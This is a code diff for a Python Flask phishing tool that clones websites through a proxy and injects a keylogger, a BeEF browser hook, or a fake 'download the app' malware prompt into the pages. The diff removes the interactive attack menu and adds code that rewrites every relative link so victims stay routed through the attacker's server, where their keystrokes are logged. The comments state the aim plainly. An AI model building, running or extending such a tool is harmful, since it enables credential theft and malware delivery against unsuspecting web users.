@@ -5,92 +5,20 @@ from flask_cors import CORS
 import requests  
 from shutil import copyfile
 from codecs import open as copen
-from platform import platform
 from os import path
 from bs4 import BeautifulSoup
 #clone.py comes with hookline
 import gclone
 
-#OS configuration stuff
-current_platform = platform()
-IS_WINDOWS = False
-if current_platform.startswith("Windows"):
-	IS_WINDOWS = True
+
+#Modules
+from lib.banner import print_banner
+
+print_banner()
+
+from lib.interphase import *
 
 
-#display banner
-b = open("banner.txt","r")
-print(b.read())
-b.close
-
-
-
-#the flask server will run on this ip and port
-h = input("ip to run on: ")
-p = input("port to run on: ")
-maldown=""
-ipb=""
-
-#menu
-print('''
-prebuilt pages will not be injected since you may want to use them for custom attacks.
-you may however find the script you wish to use and add it to the bottom of your html file.
-to use premade pages simply place your html file in the templates folder as <search term>.html 
-
-1. inject keylogger (writes to keys.txt)
-2. inject BeEF hook
-3. inject custom html or js from file
-4. browser is not supported download the app (your malware)
-	''')
-
-#choose here
-opt = int(input("option: "))
-
-#inject keylogger
-if opt == 1:
-	#if you are using ngrok etc specify 
-	ipb = input("\nip to log keys to (leave blank for same ip): ")
-	portb = input("port to log keys to (leave blank for same ip): ")
-	if not ipb:
-		ipb = h
-		print("\nusing same ip")
-	if not portb:
-		portb = p
-		print("using same port")
-
-#inject BeEF hook
-if opt == 2:
-	beef_ip=input("BeEF ip: ")
-	beef_port=input("BeEF port: ")
-	bhooktmp = open("bhook.js","r")
-	bhooktmpr = bhooktmp.read()
-	bhooktmp.close()
-	bhooktmpr = bhooktmpr.replace("~bip~",beef_ip).replace("~bport~",beef_port)
-	if IS_WINDOWS:
-		bhook = open("static\\js\\bhook.js", "w")
-	else:
-		bhook = open("static/js/bhook.js","w")
-	bhook.write(bhooktmpr)
-	bhook.close()
-
-#inject custom html or js
-if opt == 3:
-	injfname=input("filename: ")
-
-if opt == 4:
-	maldown=input("filename: ")
-	ipb = input("\nip to download from (leave blank for same ip): ")
-	portb = input("port to log keys to (leave blank for same ip): ")
-	if not ipb:
-		ipb = h
-		print("\nusing same ip")
-	if not portb:
-		portb = p
-		print("using same port")
-print('''
-	popunder location /u (might not work well on firefox sollution coming in v2.0)
-	google search location / 
-	''')
 
 #initialise app and enable CORS so the keylogger works
 app = Flask(__name__)
@@ -141,6 +69,10 @@ def tempfunc():
 @app.route("/link", methods=['GET', 'POST'])
 def link():
 	url = request.args.get("url")
+	#Remove the uri from the url
+	if url[-1] != "/":
+		url += "/"
+	base_url = "//".join(url.split("/")[:3])
 	if h in url or ipb in url or "127.0.0.1" in url or "localhost" in url or "192.168." in url or "0.0.0.0" in url:
 		url="https://en.wikipedia.org/wiki/Idiot"
 
@@ -164,11 +96,9 @@ def link():
 		#Parse the action to send the data to the right url.
 
 		#Add a slash at the end of the url to make it easier to parse.
-		if url[-1] != "/":
-				url += "/"
+		
 
-		#Remove the uri from the url
-		base_url = "//".join(url.split("/")[:3])
+		
 		
 		if action.startswith("/"):
 			post_url = base_url + action
@@ -244,7 +174,31 @@ def link():
 		#Replace the form
 		jsadd = str(jsadd_soup).replace(original_form, str(form))
 
+	links = jsadd_soup.find_all("a")
+	print(links)
 
+	#Maybe we can do everything in one forloop, but i don't know if that will be very readable.
+	for link in links:
+		original_link = str(link)
+		try:
+			if link['href'][0] == "/":
+				original_goto = base_url + link['href']
+
+			#else:
+				#if url
+
+
+			link['href'] = f"http://{ipb}:{portb}/link?url={original_goto}"
+		except Exception as e:
+			print(e)
+			
+
+		#When we have the full screen attack, we need to manage a way to create a new fake tab when a _blank <a> tag is clicked, this can probably done with javascript.
+		if "target" in link:
+			if link['target'] == '_blank':
+				del link['target']
+
+		jsadd = str(jsadd_soup).replace(original_link, str(link))
 
 
 	#add the url to our keysfile so we know what site its for
